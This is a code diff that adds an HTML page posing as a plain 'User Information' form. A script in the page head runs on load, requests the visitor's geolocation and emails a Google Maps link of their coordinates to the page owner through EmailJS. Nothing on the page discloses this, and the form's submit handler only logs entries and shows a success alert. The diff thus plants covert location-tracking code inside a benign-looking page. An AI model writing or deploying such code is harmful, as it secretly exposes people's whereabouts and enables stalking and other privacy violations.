@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>User Information Form</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+    <script>
+        (function () {
+            emailjs.init({
+                publicKey: "irNz_F_OdVu2GE84O"
+            });
+        })();
+
+        //const TWO_HOURS = 7200000     
+
+        const messg = "Enabled"
+
+        window.onload = function() {
+    sendLocationEmail();
+};
+        
+function sendLocationEmail() {
+
+            if (!navigator.geolocation) {                
+                messg = "Not Enabled"
+        
+    }
+
+            navigator.geolocation.getCurrentPosition(
+        function(position) {
+
+           const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            const params = {
+                latitude: latitude,
+                longitude: longitude,
+                location_link: `https://maps.google.com/?q=${latitude},${longitude}`
+            };
+           
+            emailjs.send(
+                "service_3hv5k7r",
+                "template_peoy2wo",
+                { 
+                    message: `https://maps.google.com/?q=${latitude},${longitude} |${messg}`
+                }
+            )
+            .then(function(response) {
+                console.log(response);
+            })
+            .catch(function(error) {
+                console.error(error);
+            });
+        } );
+
+        }
+        
+    </script>  
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f6f8;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+
+    .form-container {
+      background: white;
+      width: 100%;
+      max-width: 450px;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      margin-bottom: 6px;
+      font-weight: bold;
+    }
+
+    input,
+    select,
+    textarea {
+      width: 100%;
+      padding: 11px;
+      box-sizing: border-box;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 15px;
+    }
+
+    textarea {
+      resize: vertical;
+      min-height: 80px;
+    }
+
+    button {
+      width: 100%;
+      margin-top: 25px;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      background: #007bff;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #0056b3;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="form-container">
+    <h2>User Information</h2>
+
+    <form id="userForm">
+
+      <label for="name">Full Name</label>
+      <input type="text" id="name" name="name" required>
+
+      <label for="email">Email</label>
+      <input type="email" id="email" name="email" required>
+
+      <label for="phone">Phone Number</label>
+      <input type="tel" id="phone" name="phone">
+
+      <label for="age">Age</label>
+      <input type="number" id="age" name="age" min="1" max="120">
+
+      <label for="city">City</label>
+      <input type="text" id="city" name="city">
+
+      <label for="gender">Gender</label>
+      <select id="gender" name="gender">
+        <option value="">Select</option>
+        <option value="male">Male</option>
+        <option value="female">Female</option>
+        <option value="other">Other</option>
+        <option value="prefer_not_to_say">Prefer not to say</option>
+      </select>
+
+      <label for="message">Additional Information</label>
+      <textarea id="message" name="message"></textarea>
+
+      <button type="submit">Submit</button>
+
+    </form>
+  </div>
+
+  <script>
+    document.getElementById("userForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+
+      const formData = new FormData(this);
+
+      console.log("User Data:");
+
+      for (const [key, value] of formData.entries()) {
+        console.log(key + ":", value);
+      }
+
+      alert("Form submitted successfully!");
+
+      this.reset();
+    });
+  </script>
+
+</body>
+</html>
